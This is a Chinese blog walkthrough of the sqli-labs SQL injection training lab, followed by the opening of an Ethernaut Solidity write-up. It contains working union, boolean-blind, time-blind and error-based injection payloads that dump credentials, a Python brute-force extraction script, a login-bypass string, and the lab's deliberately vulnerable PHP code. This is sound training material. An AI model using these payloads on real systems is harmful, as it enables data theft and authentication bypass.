<p>这样子爆破数据不够爽，还得手动一个一个搓，太麻烦了,直接上<code>group_concat()</code></p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(username) from users),3 –+</p>
</blockquote>
<p><img src="/images/sql/14.png"></p>
<p>不过这是咱在翻看了源代码，并且知道这些数据的情况下做出来的，在真正注入的环境下，得需要获取这些数据，这时候就需要<code>information_schema</code>这个数据库了</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(schema_name) from schemata),3 –+</p>
</blockquote>
<p><img src="/images/sql/15.png"><br>发生什么事了？好像有点不太对劲呢。因为这题所在的数据库是<code>security</code>，而<code>schemata</code>是在<code>information_schema</code>这个数据库下面的。我们需要换成<code>information_schema.schemata</code></p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+  </p>
</blockquote>
<p><img src="/images/sql/16.png"></p>
<p>数据库爆出来了，爆表名</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;”security”),3 –+</p>
</blockquote>
<p><img src="/images/sql/17.png"></p>
<p>表名出来了，爆字段</p>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;”users”),3 –+</p>
</blockquote>
<p><img src="/images/sql/18.png"></p>
<p>需要的数据都有了，咱可以直接把库给脱下来了</p>
<h2 id="Less-2-Less-4"><a href="#Less-2-Less-4" class="headerlink" title="Less-2 - Less-4"></a>Less-2 - Less-4</h2><p>这几题都一样，无非是注入点周围包裹的东西不一样，不多赘述，过。</p>
<h2 id="Less-5-布尔盲注"><a href="#Less-5-布尔盲注" class="headerlink" title="Less-5 | 布尔盲注"></a>Less-5 | 布尔盲注</h2><blockquote>
<p>?id&#x3D;1</p>
</blockquote>
<p><img src="/images/sql/19.png"></p>
<p>眉清目秀，啥都木有。</p>
<blockquote>
<p>?id&#x3D;1”‘<br>一通测试下来，发现有了报错信息<br><img src="/images/sql/20.png"></p>
</blockquote>
<p>如何利用报错信息注入呢？</p>
<blockquote>
<p>?id&#x3D;1’ and 1 &#x3D; 1 –+<br>i<a href="images/sql/21.png"></a></p>
</blockquote>
<blockquote>
<p>?id&#x3D;2’ and 2 &#x3D; 1 –+<br><img src="/images/sql/22.png"></p>
</blockquote>
<p>那有意思的就来了，嘻嘻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                   1 |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆数据库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.104.82.167/Less-5/?id=&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;k&#125;</span> --+&quot;</span></span><br><span class="line">            r = requests.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                res += <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/sql/23.png"></p>
<p>更改payload来爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\&quot;security\&quot;),&#123;j&#125;,1)) = &#123;k&#125; --+&quot;</span><br></pre></td></tr></table></figure>

<p>更改payload 来爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;1&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;j&#125;,1)) = &#123;k&#125; --+&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Tips 无AND的情况下，可以用<code>^</code></strong></p>
<h2 id="Less-6-8-都差不多，就是需要各种奇妙的闭合"><a href="#Less-6-8-都差不多，就是需要各种奇妙的闭合" class="headerlink" title="Less 6-8 都差不多，就是需要各种奇妙的闭合"></a>Less 6-8 都差不多，就是需要各种奇妙的闭合</h2><p>略</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h2><p>这里需要时间盲注，和布尔盲注差不多只是需要添加一个if(a,sleep(10),1)判断</p>
<blockquote>
<p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</p>
</blockquote>
<p>判断参数构造。</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+</p>
</blockquote>
<p>判断数据库名长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断数据库字符</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+</p>
</blockquote>
<p>判断所有表名长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断表名</p>
<blockquote>
<p>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</p>
</blockquote>
<p>判断所有字段名的长度</p>
<blockquote>
<p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</p>
</blockquote>
<p>逐一判断字段名。</p>
<blockquote>
<p>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</p>
</blockquote>
<p>判断字段内容长度</p>
<blockquote>
<p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</p>
</blockquote>
<p>逐一检测内容。</p>
<h2 id="Less-10-一模一样，略"><a href="#Less-10-一模一样，略" class="headerlink" title="Less 10 一模一样，略"></a>Less 10 一模一样，略</h2><h2 id="Less-11-万能密码"><a href="#Less-11-万能密码" class="headerlink" title="Less 11 | 万能密码"></a>Less 11 | 万能密码</h2><p>这次开始，不是get传参了，换成POST传参还给了个登录框，先随便穿个数据康康<br><img src="/images/sql/25.png"></p>
<p>这时候拿出我们的究极无敌炫酷万能密码<code>1&#39; or 1=1#</code><br><img src="/images/sql/26.png"></p>
<p>好了，这就进去了</p>
<p>为什么呢？咱把源码翻开</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity </span></span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); <span class="comment">//注意这里</span></span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键点在这里<code>$result=mysql_query($sql);</code></p>
<p>这里的结果是用sql语句的查询结果来，所以只需要让语句返回一个真就行了，<code>or 1 = 1</code>使得整个语句恒真，这就让我们成功登陆进去了</p>
<p>之后我们就可以注入获取信息了。</p>
<h2 id="Less-12-16-都差不多"><a href="#Less-12-16-都差不多" class="headerlink" title="Less 12 -16 都差不多"></a>Less 12 -16 都差不多</h2><p>略</p>
<h2 id="Less-17-报错注入"><a href="#Less-17-报错注入" class="headerlink" title="Less 17 | 报错注入"></a>Less 17 | 报错注入</h2><p>这题开始不同了，使用的是<code>update</code>而不是<code>select</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysql_error</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错注入开淦</p>
<h3 id="能进行报错的函数"><a href="#能进行报错的函数" class="headerlink" title="能进行报错的函数"></a>能进行报错的函数</h3><h4 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ul>
<li>演示: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;\114514\&#x27;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">* payload:</span><br></pre></td></tr></table></figure>
1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本</li>
</ul>
<p>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   爆表名</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x5c)))#<br> 爆字段名</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’admin1’) b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。</p>
<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#### updatexml()</span><br><span class="line"></span><br><span class="line">* `updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。</span><br><span class="line">* 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</span><br><span class="line">* updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>5.5.44-0ubuntu0.14.04.1</del>‘</p>
<pre><code>
公式:
updatexml(数字,带有&#39;~&#39;的任何东西,数字)
updatexml(数字,(concat(0x7e,(长度不过63的任意字符),0x7e)),数字)


## less 18 - Less19

地点不一样，懒得弄了.

## Less20 - Less23
base64编码了一下，还是一样

## Less24 | 二次注入
</code></pre>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/inject/">inject</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-04  <a class="commentCountImg" href="/2022/10/04/solidity/#comment-container"><span class="display-none-class">fd6cc784aaa537f6d23e038bbb885fa6</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="fd6cc784aaa537f6d23e038bbb885fa6">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>14 分钟  <i class="fas fa-pencil-alt"> </i>2.1 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/04/solidity/">Ethernaut刷题记录</a></h1><div class="content"><h1 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h1><p><a target="_blank" rel="noopener" href="https://wtf.academy/solidity-start/Function/">来自这里</a></p>
<h2 id="可见修饰符"><a href="#可见修饰符" class="headerlink" title="可见修饰符"></a>可见修饰符</h2><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="ethernaut"><a href="#ethernaut" class="headerlink" title="ethernaut"></a>ethernaut</h1><h1 id="0-注意事项"><a href="#0-注意事项" class="headerlink" title="0.注意事项"></a>0.注意事项</h1><ul>
<li><code>@openzeppelin/contracts/math/SafeMath.sol</code> 的地址已经迁移，做这个靶场的时候得自己手动改成<code>&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code></li>
